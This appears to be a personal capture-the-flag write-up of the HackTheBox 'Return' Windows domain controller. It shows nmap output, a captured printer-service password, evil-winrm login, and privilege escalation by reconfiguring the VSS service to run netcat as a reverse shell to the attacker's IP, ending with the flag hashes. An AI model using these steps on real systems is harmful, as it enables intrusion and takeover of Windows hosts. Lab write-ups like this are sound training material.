+++
title = "HTB - Return"
date = 2024-10-27
+++

```
nmap -sV -sC -p- --open 10.10.11.108 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-27 10:12 EDT
Nmap scan report for 10.10.11.108
Host is up (0.19s latency).
Not shown: 65484 closed tcp ports (reset), 26 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: HTB Printer Admin Panel
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-10-27 14:31:57Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49682/tcp open  msrpc         Microsoft Windows RPC
49697/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: PRINTER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-10-27T14:32:56
|_  start_date: N/A
|_clock-skew: 18m33s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 126.25 seconds
                                                          
```

### Enumeration
Domain Controller!
Port 80 open. I see http headers, but why no port 80???
Printer creds in settings?  
No. But we can analyze in burp and see that printer.return.local is sent when /POST. 
Start our listener and send our IP for potential info
Password  `1edFg43012!!`
Evil Winrm `evil-winrm -i 10.10.11.108 -u svc-printer -p '1edFg43012!!'`
Got a TON of privs. Tried to abuse SEBackup priv. Could've been directory issue. 
We can use whoami /groups to find out what we belong to. Server Operators is a very important group, and you can read more about it in 0xdf walkthrough. Important thing is that we can start and stop services. Upload a x64 veriosn of netcat to the box
`upload /home/li0t/Desktop/HTB/Return/nc64.exe`
Ususally, we can find a list of services available to mess with using `sc.exe query`
but we get no access
I found this one thru xdf. do reading on official writeup
THen, edit the service to incorporate our uploaded NC
`sc.exe config VSS binpath="C:\windows\system32\cmd.exe /c C:\Users\svc-printer\Documents\nc64.exe -e cmd 10.10.14.15 443"`
Start the VSS service `sc.exe start VSS`
Back on our listener, we get a connection!
USER:`cadf711faad65185727472a169eec588`
ROOT:`cca5c25443fb538a0bc851ab0d66f246`


